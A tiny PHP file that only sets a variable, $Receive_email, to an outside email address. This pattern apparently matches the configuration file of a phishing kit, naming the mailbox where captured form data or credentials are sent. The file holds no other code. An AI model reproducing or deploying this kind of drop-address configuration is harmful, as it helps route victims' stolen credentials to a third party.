<?php 
$Receive_email="sendmail89@dieterlanger.sa.com";
?>